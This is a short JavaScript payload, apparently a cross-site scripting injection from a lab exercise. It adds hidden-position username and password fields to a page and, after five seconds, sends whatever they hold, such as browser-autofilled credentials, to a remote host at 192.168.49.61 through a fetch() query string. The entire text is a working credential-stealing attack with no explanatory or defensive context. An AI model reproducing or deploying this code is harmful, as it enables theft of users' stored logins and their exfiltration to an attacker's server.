let body = document.getElementsByTagName("body")[0]
var u = document.createElement("input")
u.type="text"
u.style.position="fixed"

var p = document.createElement("input")
p.type = "password"
p.style.position = "fixed"

body.append(u)
body.append(p)

setTimeout(function(){fetch("http://192.168.49.61/k?u="+u.value+"&p="+p.value)},5000);
